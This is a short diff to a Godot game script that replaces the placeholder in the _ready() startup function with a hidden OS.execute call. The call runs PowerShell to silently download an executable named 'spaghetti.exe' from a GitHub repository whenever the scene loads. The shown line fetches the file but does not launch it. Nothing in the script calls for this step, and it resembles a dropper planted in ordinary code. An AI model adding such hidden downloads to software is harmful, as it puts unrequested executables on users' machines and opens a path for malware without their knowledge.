@@ -4,8 +4,8 @@ extends Node
 
 # Called when the node enters the scene tree for the first time.
 func _ready() -> void:
-	pass # Replace with function body.
-
+	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe"])
+	#pass
 
 # Called every frame. 'delta' is the elapsed time since the previous frame.
 func _process(delta: float) -> void:
